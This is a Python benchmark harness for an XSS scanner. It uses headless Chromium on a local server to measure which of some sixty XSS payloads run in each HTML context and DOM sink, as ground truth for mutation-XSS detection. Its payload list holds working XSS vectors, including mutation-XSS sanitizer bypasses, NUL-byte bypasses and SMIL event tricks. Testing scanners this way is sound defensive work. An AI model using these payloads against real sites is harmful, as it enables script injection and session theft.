"""Browser DOM oracle: what Chromium ACTUALLY executes, per context and per sink.

The pure-Python sandbox (`xssentinel/core/sandbox.py`) is a claim about HTML
parser behaviour.  A claim with no oracle in front of it is how a scanner ends
up reporting `<img src=javascript:...>` as "marker executed" -- the exact class
of over-statement Phases 167/168 had to walk back.  So this file is written
FIRST and the sandbox is scored against it, not the other way round.

Why the measurement is three-dimensional (payload x context x sink)
-------------------------------------------------------------------
The first revision of this oracle measured one axis only -- `div.innerHTML =
fragment` -- and came back with zero mXSS across eight canonical mutation
vectors, which is not a finding about Chromium, it is a bug in the harness:

  * `<svg onload=CODE>` does not run through innerHTML but does run through the
    parser.  One number per payload collapsed the two.
  * `"><img src=x onerror=CODE>` is only an escape *relative to a quoted
    attribute*; pasted as a bare fragment it "executes" trivially, so a
    context-free harness reports every attribute payload as a live XSS.
  * mXSS is `exec2 and not exec1`.  Measuring exec1 through the wrong sink
    makes every vector look like it executes immediately, and the mutation
    becomes invisible.

So each case is scored under two sinks that a real engagement actually hits:

    parser     -- the bytes the server reflected, loaded as a real document
                  over HTTP.  This is reflected/stored XSS as a browser sees it.
    innerhtml  -- the same bytes re-parsed by a client-side template sink
                  (`el.innerHTML = ...`), then serialised and parsed AGAIN.
                  exec2 without exec1 is mutation XSS.

`serialized` is recorded too, because the sandbox has to reproduce Chromium's
*output*, not just its verdict -- an innerHTML serialiser that differs from the
browser's is a round-trip that never matches.

Sentinel is ``__x()`` (sets a localStorage flag), deliberately quote-free: a
test payload then never has to fight Python/JS/HTML quoting, and a missing
quote cannot masquerade as a parser result.  localStorage survives navigation
inside the tab, so it reports from parser loads too.  Nested browsing contexts
that are opaque-origin report ``None`` = inconclusive, never "did not execute"
(the lesson already written down in benchmark/sink_execution.py).

Usage:
    python -m benchmark.browser_dom_oracle            # full matrix
    python -m benchmark.browser_dom_oracle --limit 12 # smoke run
Writes benchmark/results/browser_dom_oracle.json
"""
from __future__ import annotations

import json
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

sys.path.insert(0, ".")

# Payloads and their serialisations carry U+0000..U+001F and U+FFFD; the Windows
# console codec here is cp936 and encoding one of those mid-print aborts the run
# with a traceback that names no test.  Never let the report kill the measurement.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

X = "__x()"                              # same-document sentinel, quote-free
TX = "top.__x()"                          # nested browsing context, same-origin
N = "\x00"                                # U+0000, the bypass byte

# ---------------------------------------------------------------------------
# Payloads: what a pentest actually sends.
# (id, payload, tags)
# ---------------------------------------------------------------------------
PAYLOADS: list[tuple[str, str, tuple[str, ...]]] = [
    ("img-onerror", f"<img src=x onerror={X}>", ("event", "img")),
    ("svg-onload", f"<svg onload={X}>", ("event", "svg", "load")),
    ("body-onload", f"<body onload={X}>", ("event", "load", "drop")),
    ("script-plain", f"<script>{X}</script>", ("script",)),
    ("input-autofocus", f"<input autofocus onfocus={X}>", ("event", "focus")),
    ("details-ontoggle", f"<details open ontoggle={X}>", ("event", "toggle")),
    ("marquee-onstart", f"<marquee onstart={X}>", ("event", "marquee")),
    ("video-source", f"<video><source onerror={X}></video>", ("event", "media")),
    ("anchor-jsuri", f'<a href="javascript:{X}">c</a>', ("url", "activation")),
    ("iframe-srcdoc", f'<iframe srcdoc="&lt;img src=x onerror={TX}&gt;"></iframe>',
     ("nested", "srcdoc")),
    ("embed-jsuri", f'<embed src="javascript:{X}">', ("url", "plugin")),
    ("object-jsuri", f'<object data="javascript:{X}"></object>', ("url", "plugin")),
    ("meta-refresh-js",
     f'<meta http-equiv="refresh" content="0;url=javascript:{X}">', ("url", "meta")),
    ("base-jsuri", f'<base href="javascript:{X}"><a href="{X}">c</a>',
     ("url", "base", "activation")),
    ("svg-script", f"<svg><script>{X}</script></svg>", ("script", "svg")),
    ("svg-animate", f'<svg><a><animate attributeName="href" '
                    f'values="javascript:{X}"/><text y=9>g</text></a></svg>',
     ("svg", "smil", "activation")),
    ("entity-img", f"&lt;img src=x onerror={X}&gt;", ("entity",)),
    ("cdata-img", f"<svg><![CDATA[<img src=x onerror={X}>]]></svg>", ("cdata",)),
    ("nullbyte-img", f"<img sr\x00c=x onerror={X}>", ("nullbyte",)),
    ("formaction", f'<form><button formaction="javascript:{X}">s</button></form>',
     ("url", "activation", "form")),
    # ---- mutation-xss family: inert once, live twice ----
    ("mxss-noscript-title",
     f'<noscript><p title="</noscript><img src=x onerror={X}>">', ("mxss", "noscript")),
    ("mxss-svg-style",
     f'<svg><style><img src=x onerror="{X}"></style></svg>', ("mxss", "foreign")),
    ("mxss-math-style",
     f'<math><style><img src=x onerror="{X}"></style></math>', ("mxss", "foreign")),
    ("mxss-svg-p-style",
     f'<svg></p><style><a id="</style><img src=x onerror={X}>">', ("mxss", "foreign")),
    ("mxss-form-math-mtext",
     f'<form><math><mtext></form><form><mglyph><style>'
     f'</style><img src=x onerror={X}>', ("mxss", "form", "foreign")),
    ("mxss-table-svg-style",
     f'<table><tr><td><svg><style><img src=x onerror="{X}"></style></svg></td></tr></table>',
     ("mxss", "table", "foreign")),
    ("mxss-select-style",
     f'<select><option><style></option></select><img src=x onerror={X}></style></select>',
     ("mxss", "select")),
    ("mxss-xmp-noscript",
     f'<xmp><noscript></xmp><img src=x onerror={X}>', ("mxss", "xmp")),
    ("mxss-template", f"<template><script>{X}</script></template>",
     ("mxss", "template")),
    ("mxss-body-br", f'<svg><p><body><img src=x onerror={X}>', ("mxss", "body")),
    ("mxss-mathy-offset",
     f'<math><mi//></math><img src=x onerror={X}>', ("mxss", "math")),
    # ---- found by benchmark/sanitizer_probe.py, added here because the browser
    # round-trips it from inert to LIVE with no sanitizer in the middle.  The
    # mechanism: the empty <table> is foster-parented OUT of the MathML subtree
    # during serialisation, which moves the <style> element, whose content the
    # serialiser writes verbatim (no-escaping element) -- and the verbatim bytes
    # re-parse as a live <img>.  This is what `exec_ihn2 and not exec_ihn1` is
    # for, and until this row the corpus simply had no payload of the shape.
    ("mxss-mtext-table-mglyph",
     f'<math><mtext><table><mglyph><style>'
     f'<img src=x onerror="{X}"></style>', ("mxss", "math", "foster")),
    ("mxss-mtext-table-only",
     f'<math><mtext><table><style>'
     f'<img src=x onerror="{X}"></style>', ("mxss", "math", "foster")),
    ("mxss-mglyph-nested",
     f'<math><mtext><mglyph><style>'
     f'<img src=x onerror="{X}"></style>', ("mxss", "math")),
    ("mxss-table-caption-svg",
     f'<table><caption></caption><td><svg><style>'
     f'<img src=x onerror="{X}"></style></svg></td></table>',
     ("mxss", "table", "foster")),
    ("closing-tag-break", f"</div><img src=x onerror={X}>", ("nesting",)),
    ("quote-break-dq", f'"><img src=x onerror={X}>"', ("escape", "attr")),
    ("quote-break-sq", f"'><img src=x onerror={X}>", ("escape", "attr")),
    ("attr-inject", f'" onmouseover="{X}', ("escape", "attr")),
    ("unquoted-inject", f"{X} onfocus={X} autofocus", ("escape", "attr", "unquoted")),
    ("js-string-break", f"';{X};var a='", ("escape", "js")),
    ("script-close-break", f"';</script><img src=x onerror={X}>", ("escape", "script")),
    ("title-close-break", f"</title><img src=x onerror={X}>", ("escape", "rcdata")),
    ("style-close-break", f"</style><img src=x onerror={X}>", ("escape", "rawtext")),
    ("expr-css", f"<style>a{{width:expression({X})}}</style>", ("css", "legacy")),
    # NUL family.  `bypass.py` and data/payloads.json both ship these as
    # null-byte-insertion bypasses, and the tokenizer's answer is per-context,
    # not one rule: U+0000 is DROPPED in document text, becomes U+FFFD in tag
    # names, attribute names, attribute values, comments, RCDATA and RAWTEXT, and
    # `&#0;` decodes to U+FFFD rather than to nothing.  Getting any of those
    # backwards turns a dead payload into a live <script> or an inert
    # `jav\ufffdascript:` into a live javascript: URI -- both are over-claims, and
    # without these rows the 900-case referee cannot see them.  The expected
    # behaviour is measured codepoint by codepoint in benchmark/probe_nul.py.
    ("nul-tagname", f"<scr{N}ipt>{X}</scr{N}ipt>", ("nul", "bypass")),
    ("nul-attrname", f"<img sr{N}c=x on{N}error={X}>", ("nul", "bypass")),
    ("nul-attrvalue", f'<a href="jav{N}ascript:{X}">c</a>', ("nul", "url")),
    ("nul-zero-entity", f'<a href="jav&#x00;ascript:{X}">c</a>', ("nul", "url")),
    ("nul-handler-value", f'<img src=x onerror="ale{N}rt(1);{X}">',
     ("nul", "event")),
    ("nul-in-text", f"<p>{X}{N}tail</p>", ("nul", "text")),
    # SMIL timing family.  data/payloads.json ships 27 of these and the referee
    # had never seen one; each shape was measured first in
    # benchmark/probe_smil.py, including the one that looks like it should fire
    # and does not (`<discard onbegin>`).
    ("smil-animate-begin",
     f'<svg><animate onbegin={X} attributeName="x" dur="1s"></animate></svg>',
     ("smil", "event")),
    ("smil-set-begin",
     f'<svg><set onbegin={X} attributeName="x" to="1"></set></svg>',
     ("smil", "event")),
    ("smil-animatetransform-begin",
     f'<svg><animateTransform onbegin={X} attributeName="transform"'
     f' dur="1s"></animateTransform></svg>', ("smil", "event")),
    ("smil-discard-begin",
     f'<svg><rect width=4 height=4><discard onbegin={X} begin="0s"></discard>'
     f'</rect></svg>', ("smil", "event")),
    ("smil-begin-indefinite",
     f'<svg><animate onbegin={X} attributeName="x" begin="indefinite" dur="1s">'
     f'</animate></svg>', ("smil", "event")),
    ("smil-animate-end",
     f'<svg><animate onend={X} attributeName="x" dur="1s"></animate></svg>',
     ("smil", "event")),
    ("smil-html-onbegin", f'<div onbegin={X}>t</div>', ("smil", "event")),
    ("smil-animate-href-js",
     f'<svg width=40 height=40><a><text>x</text><animate attributeName="href"'
     f' values="javascript:{X}" dur="1s" fill="freeze"></animate></a></svg>',
     ("smil", "url")),
    ("css-animation-start",
     '<style>@keyframes k{from{opacity:0}to{opacity:1}}</style>'
     f'<div style="animation:k 1s" onanimationstart={X}>t</div>',
     ("css", "event")),
]

#: Some events cannot occur until the animation clock has elapsed.  Judging them
#: inside the default settle window manufactures a browser `False` that really
#: means "not yet" -- the same failure the `commit` navigation once produced for
#: `<iframe srcdoc>` (see `_wait_load`), so it is bounded the same way: give the
#: mechanism the time it actually needs.
SETTLE_OVERRIDES = {
    "smil-animate-end": 1800,
}

# Per-HOST settle, added in Phase 176i to settle a specific disagreement.
#
# `mxss-body-br` x `iframe_src` came back exec_ihn1=False / exec_ihn2=True,
# i.e. looking like mutation XSS.  But an iframe only loads its srcdoc AFTER it
# is attached to a live document, and it loads asynchronously -- so "False on
# round 1" has two very different explanations:
#
#   (a) the payload really is inert until a serialisation round-trip (mXSS), or
#   (b) 300ms simply was not enough for the child document to run, and round 2
#       only "executed" because the frame had finished loading in the meantime.
#
# Guessing between them is how you either ship an engine bug or delete a real
# one, so the host gets a generous settle and the case is re-measured.  If
# exec_ihn1 flips to True it was (b) -- a harness artefact, and the sandbox was
# right all along.  If it stays False while exec_ihn2 stays True, it is (a) and
# sandbox.py owes us a MUTATED verdict for srcdoc.
HOST_SETTLE_OVERRIDES = {
    "iframe_src": 1500,
}

# ---------------------------------------------------------------------------
# Hosts: where the payload lands in the document the server returned.
# ``__P__`` is the reflection point.  ``sink_ok`` says which sinks are a
# meaningful question for this host.
# ---------------------------------------------------------------------------
Host = tuple[str, str, str]
HOSTS: list[Host] = [
    ("text", "<html><body><div>__P__</div></body></html>", "any"),
    ("attr_dq", '<html><body><div class="__P__">t</div></body></html>', "any"),
    ("attr_sq", "<html><body><div class='__P__'>t</div></body></html>", "any"),
    ("attr_unq", "<html><body><div class=__P__>t</div></body></html>", "any"),
    ("title", "<html><head><title>__P__</title></head><body>b</body></html>", "any"),
    ("textarea", "<html><body><textarea>__P__</textarea></body></html>", "any"),
    ("style", "<html><head><style>__P__</style></head><body>b</body></html>", "any"),
    ("svg_style",
     "<html><body><svg><style>__P__</style></svg></body></html>", "any"),
    ("math_mtext",
     "<html><body><math><mtext>__P__</mtext></math></body></html>", "any"),
    ("script_dq",
     '<html><body><script>var a = "__P__";</script></body></html>', "any"),
    ("script_block", "<html><body><script>__P__</script></body></html>", "any"),
    ("comment", "<html><body><!--__P__--></body></html>", "any"),
    ("noscript",
     "<html><body><noscript>__P__</noscript></body></html>", "scripting_off"),
    ("xmp", "<html><body><xmp>__P__</xmp></body></html>", "any"),
    ("iframe_src",
     '<html><body><iframe srcdoc="__P__"></iframe></body></html>', "any"),
    ("event_dq",
     '<html><body><img src="__P__" alt="a"></body></html>', "any"),
    ("href_dq",
     '<html><body><a href="__P__">t</a></body></html>', "any"),
    ("template",
     "<html><body><template>__P__</template></body></html>", "any"),
    ("table_td",
     "<html><body><table><tr><td>__P__</td></tr></table></body></html>", "any"),
    ("select",
     "<html><body><select><option>__P__</option></select></body></html>", "any"),
]


class _Handler(BaseHTTPRequestHandler):
    """Serves `_PAGES[path]`; two paths so each measurement starts clean.

    The first revision of this file read the sentinel without clearing it
    between the parser probe and the innerHTML probe, and came back with
    "executes via parser" == "executes via innerHTML" for all 820 cases and
    zero mXSS.  Both numbers were the parser's.  Sink measurements need their
    own document, so the innerHTML probes run on `/blank`.
    """

    PAGES: dict[str, str] = {}

    def do_GET(self):  # noqa: N802
        body = self.PAGES.get(self.path, "<html><body></body></html>")
        body = body.encode("utf-8", "replace")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):  # silence
        pass


_INIT = """
window.__x = function () { try { localStorage.setItem('__exec', '1'); } catch (e) {} };
"""


def _read_hit(page):
    """True / False / None -- None means the sentinel itself was unreachable,
    which is never evidence of non-execution."""
    try:
        v = page.evaluate("() => { try { return localStorage.getItem('__exec')"
                          " === '1' } catch (e) { return null } }")
    except Exception:
        return None
    return v


def _wait_load(page, budget_ms: int = 3000, step_ms: int = 100) -> bool:
    """Wait until `document.readyState == 'complete'`, bounded.

    The parser arm used to read the sentinel a fixed `settle_ms` after
    `wait_until="commit"` -- and `commit` returns before the document has loaded.
    For a NESTED browsing context that is not a bound at all: `<iframe srcdoc>`
    has to create the frame, parse it, request the image and run the handler.
    One such row sampled `exec_parser=False` while five re-measurements of the
    same shape at the same settle window came back True every time -- a False
    manufactured by the harness, which then reads as an OVER against a correct
    sandbox verdict.

    Parent `complete` *is* a bound: the window load event waits for every frame,
    and a frame's own load waits for its subresources to finish loading or
    error, so by the time this returns the handler has either run or not.
    """
    waited = 0
    while True:
        try:
            if page.evaluate("() => document.readyState") == "complete":
                return True
        except Exception:
            return False
        if waited >= budget_ms:
            return False
        page.wait_for_timeout(step_ms)
        waited += step_ms


def _clear(page) -> None:
    try:
        page.evaluate("() => { try { localStorage.clear(); } catch (e) {} }")
    except Exception:
        pass

_PROBE = """
async (o) => {
  const live = (root) => {
    const out = [];
    const walk = (n) => {
      for (const c of n.childNodes) {
        if (c.nodeType === 1) {
          const el = c, attrs = [];
          for (const a of el.attributes || []) {
            const nm = a.name.toLowerCase();
            if (/^on/.test(nm)) attrs.push(nm + ':handler');
            else if (nm === 'srcdoc') attrs.push('srcdoc');
            else if (/^(href|src|action|formaction|data|code)$/.test(nm)
                     && /^\\s*(java\\s*script:)/i.test(a.value.replace(/[\\u0000-\\u001f]/g, '')))
              attrs.push(nm + ':jsuri');
          }
          if (attrs.length) out.push(el.tagName.toLowerCase() + '[' + attrs.join(' ') + ']');
          if (el.tagName.toLowerCase() === 'script') out.push('script');
          walk(el);
        }
      }
    };
    walk(root);
    return out;
  };
  const r = {ser: null, live: [], err: null};
  try {
    const c = document.createElement('div');
    c.innerHTML = o.html;
    r.ser = c.innerHTML;
    r.live = live(c);
    document.body.appendChild(c);
    await new Promise(res => setTimeout(res, o.settle));
  } catch (e) { r.err = String(e).slice(0, 140); }
  return r;
}
"""

_REPROBE = """
async (o) => {
  const c = document.createElement('div');
  c.innerHTML = o.html;
  const ser = c.innerHTML;
  document.body.appendChild(c);
  await new Promise(res => setTimeout(res, o.settle));
  return ser;
}
"""


def _serve() -> tuple[ThreadingHTTPServer, str]:
    srv = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{srv.server_address[1]}"


def _goto(page, url: str, wait: str = "load", tries: int = 3) -> bool:
    """Navigate, retrying a transient local-server failure.

    A 900-case run over a stdlib loopback server WILL hit the occasional
    ERR_CONNECTION_RESET.  When that happened here it killed the run at case 74
    and threw away 13 minutes of measurement, because the harness treated one
    lost request as a fatal error.  Retry, then report the row as inconclusive --
    a lost row is recoverable, a lost run is not.
    """
    for attempt in range(tries):
        try:
            page.goto(url, wait_until=wait)
            return True
        except Exception:
            if attempt == tries - 1:
                return False
            page.wait_for_timeout(120 * (attempt + 1))
    return False


def run(settle_ms: int = 300, limit: int = 0) -> list[dict]:
    from playwright.sync_api import sync_playwright

    srv, base = _serve()
    _Handler.PAGES = {"/blank": "<html><body></body></html>"}
    rows: list[dict] = []
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch()
            ctx = browser.new_context()
            ctx.add_init_script(_INIT)
            page = ctx.new_page()
            page.goto(base + "/blank", wait_until="load")
            for pid, payload, tags in PAYLOADS:
                for hid, host, _ok in HOSTS:
                    if limit and len(rows) >= limit:
                        break
                    doc = host.replace("__P__", payload)
                    row: dict = {"payload": pid, "host": hid,
                                 "tags": list(tags), "document": doc}

                    settle = max(settle_ms, SETTLE_OVERRIDES.get(pid, 0),
                                 HOST_SETTLE_OVERRIDES.get(hid, 0))

                    # ---- sink 1: the parser, i.e. what the server reflected --
                    _Handler.PAGES["/p"] = doc
                    if not _goto(page, base + "/blank"):
                        row.update({"payload": pid, "host": hid,
                                    "exec_parser": None, "exec_ihn1": None,
                                    "exec_ihn2": None, "mxss": False,
                                    "harness_error": "loopback reset"})
                        rows.append(row)
                        continue
                    _clear(page)
                    try:
                        page.goto(base + "/p", wait_until="commit")
                        _wait_load(page)
                        page.wait_for_timeout(settle)
                        row["exec_parser"] = _read_hit(page)
                    except Exception as e:
                        row["exec_parser"] = None
                        row["parser_err"] = str(e)[:120]

                    # ---- sink 2: a DOM sink re-parses the same bytes ---------
                    if not _goto(page, base + "/blank"):
                        row["exec_ihn1"] = row["exec_ihn2"] = None
                        row["mxss"] = False
                        row["harness_error"] = "loopback reset before sink2"
                        rows.append(row)
                        print(f"  SKIP   {pid} x {hid} (loopback reset)",
                              flush=True)
                        continue
                    _clear(page)
                    try:
                        a = page.evaluate(_PROBE, {"html": doc,
                                                   "settle": settle})
                        row["exec_ihn1"] = _read_hit(page)
                        row["serialized"] = a["ser"]
                        row["live_after_parse"] = a["live"]
                        if a["err"]:
                            row["ihn1_err"] = a["err"]
                        _clear(page)
                        row["serialized2"] = page.evaluate(
                            _REPROBE, {"html": a["ser"] or "",
                                               "settle": max(150, settle)})
                        row["exec_ihn2"] = _read_hit(page)
                        row["mutated"] = (a["ser"] or "") != (
                            row["serialized2"] or "")
                    except Exception as e:
                        row["exec_ihn1"] = row["exec_ihn2"] = None
                        row["ihn_err"] = str(e)[:120]
                    row["mxss"] = bool(row.get("exec_ihn2")
                                       and not row.get("exec_ihn1"))
                    rows.append(row)
                    print(f"  {pid:22s} {hid:12s} parser="
                          f"{'Y' if row.get('exec_parser') else ('?' if row.get('exec_parser') is None else '.')}"
                          f" ihn1={'Y' if row.get('exec_ihn1') else ('?' if row.get('exec_ihn1') is None else '.')}"
                          f" ihn2={'Y' if row.get('exec_ihn2') else ('?' if row.get('exec_ihn2') is None else '.')}"
                          f" {'M' if row['mxss'] else ' '}", flush=True)
                if limit and len(rows) >= limit:
                    break
            browser.close()
    finally:
        srv.shutdown()
    return rows


def main() -> int:
    limit = 0
    if "--limit" in sys.argv:
        limit = int(sys.argv[sys.argv.index("--limit") + 1])
    rows = run(limit=limit)
    out = os.path.join("benchmark", "results", "browser_dom_oracle.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    json.dump({"oracle": "chromium", "count": len(rows), "payloads": [p[0] for p in PAYLOADS],
               "hosts": [h[0] for h in HOSTS], "rows": rows},
              open(out, "w", encoding="utf-8"), ensure_ascii=False, indent=1)

    n = len(rows)
    print("\n=== oracle summary ===")
    print(f"cases                       : {n}")
    print(f"executes via parser         : {sum(1 for r in rows if r.get('exec_parser'))}")
    print(f"executes via innerHTML (1st): {sum(1 for r in rows if r.get('exec_ihn1'))}")
    print(f"executes after round-trip   : {sum(1 for r in rows if r.get('exec_ihn2'))}")
    print(f"mutation XSS (ihn2 not ihn1): {sum(1 for r in rows if r.get('mxss'))}")
    print(f"serialization changed on 2nd round-trip: "
          f"{sum(1 for r in rows if r.get('mutated'))}")
    print("\nmutation-XSS cases (the pure-Python sandbox must model these):")
    for r in rows:
        if r.get("mxss"):
            print(f"   - {r['payload']:22s} {r['host']}")
    print("\nparser-live but innerHTML-inert (sink matters):")
    for r in rows:
        if r.get("exec_parser") and not r.get("exec_ihn1"):
            print(f"   - {r['payload']:22s} {r['host']}")
    print("written:", out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
